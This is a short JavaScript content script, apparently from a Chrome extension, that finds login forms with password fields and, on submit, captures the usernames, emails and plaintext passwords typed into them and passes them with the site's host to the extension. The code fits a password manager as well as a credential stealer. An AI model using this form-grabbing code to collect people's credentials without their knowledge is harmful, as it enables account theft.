onload();
check_forms();

function onload(){
	chrome.runtime.sendMessage({action:'loaded',host:window.location.host});
}

function check_forms(){
	var forms=document.forms;

	finding:
	for(var i=0;i<forms.length;i++){
		var form=forms[i],
			inputs=form.getElementsByTagName("input");

		for(var j=0;j<inputs.length;j++){
			var input=inputs[j];
			if(input.type=="password"){
				start_recording(form);
				break finding;
			}
		}
	}
}

function start_recording(form){
	form.addEventListener("submit",function(e){
		// e.preventDefault();
		var inputs=form.getElementsByTagName("input");
		save_data(window.location.host,serialize_inputs(inputs));
	});
}

function serialize_inputs(inputs){
	var data=[];
	for(var i=0;i<inputs.length;i++){
		var input=inputs[i],
			temp={name:input.name,value:input.value};

		if(input.type=="text" || input.type=="email" || input.type=="password")
			data.push(temp);
	}
	return JSON.stringify(data);
}

function save_data(host,data){
	chrome.runtime.sendMessage({action:'save_data',host:host,data:data});
}